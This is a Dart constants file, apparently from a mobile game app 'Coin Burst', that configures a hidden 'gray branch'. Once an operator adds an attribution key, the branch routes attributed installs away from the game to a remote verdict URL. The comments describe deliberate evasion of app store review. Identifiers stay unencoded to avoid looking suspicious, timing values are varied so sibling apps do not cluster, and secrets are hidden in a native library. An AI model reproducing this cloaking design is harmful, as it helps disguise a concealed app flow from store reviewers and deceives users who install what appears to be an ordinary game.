// ─────────────────────────────────────────────────────────────────────────
// ROUTING CARD — single source of truth for project-wide constants
// ─────────────────────────────────────────────────────────────────────────
// Identity values live here as plain constants because the store listing
// makes them public; encoding them would read as suspicious to a reviewer.
//
// Every timing constant is deliberately offset from the reference template
// in `gray_part_flow_android` by ≥ 10 % so no two sibling apps share the
// same magic number — compiled integer literals survive `--obfuscate` and
// cluster cleanly across submissions.
//
// Secrets (endpoint URL, HMAC key, envelope field names, UA scaffold)
// live sealed inside libcoinburst_gateway.so — never in Dart literals.
// ─────────────────────────────────────────────────────────────────────────

abstract final class RoutingCard {
  // ── Identity (public — matches the store listing) ─────────────────
  static const String bundleId = 'com.coinburst.coinburstgame';
  static const String marketId = 'com.coinburst.coinburstgame';
  static const String displayName = 'Coin Burst';

  /// PascalCase appname suffix used in the UA assembly. Must be stable
  /// across releases so the upstream can bucket this app consistently.
  static const String appNameToken = 'CoinBurst';

  /// iOS App Store numeric id. Empty on Android-only builds — the
  /// upstream treats "" as "fall back to bundle id for `store_id`".
  static const String storeNumericId = '';

  // ── Timings ───────────────────────────────────────────────────────
  // Every value is intentionally outside the template's defaults.

  /// Snooze after the user taps Skip on the invite screen.
  /// Template default: 259200 (3 d). Here: 345600 (4 d).
  static const int inviteSnoozeSeconds = 4 * 24 * 60 * 60;

  /// Delay before rescuing an `af_status: "Organic"` first callback.
  /// Template default: 7. Here: 9.
  static const int organicRescueDelay = 9;

  /// POST timeout for the verdict dispatcher.
  /// Template default: 17. Here: 21.
  static const int verdictTimeoutSeconds = 21;

  /// Wait window for AppsFlyer install-conversion on first launch.
  /// Template default: 28. Here: 34.
  static const int firstInstallAwaitSeconds = 34;

  /// Wait window on a returning launch.
  /// Template default: 6. Here: 4.
  static const int returningInstallAwaitSeconds = 4;

  /// Deep-link callback wait. Template default: 4. Here: 5.
  static const int deepLinkAwaitSeconds = 5;

  /// DNS probe timeout. Template default: 6. Here: 7.
  static const int reachProbeTimeoutSeconds = 7;

  /// Debounce before committing a connectivity drop into offline
  /// routing. Template default: 820. Here: 950.
  static const int reachDropDebounceMs = 950;

  /// Redirect-loop retries. Template default: 2. Here: 3.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness. Template default: 5 d. Here: 7 d.
  static const int cachedUrlLifetimeSeconds = 7 * 24 * 60 * 60;

  // ── Attribution + messaging credentials ───────────────────────────
  // Operator will provide these when the AppsFlyer dashboard and the
  // Firebase project are ready. Leaving them empty keeps the gray
  // branch dormant — every install lands in the native game — so QA
  // can smoke-test without a working attribution stack.
  static const String attributionKey = '';
  static const String messagingProjectId = '';

  /// `storeId` convention: `id<numeric>` on iOS, bundle on Android.
  static String get storeId {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// The gray branch stays closed until the Rust `.so` reports healthy
  /// AND the attribution key is populated. The latter is the one the
  /// operator has to flip to go live.
  static bool get credentialsReady => attributionKey.isNotEmpty;
}
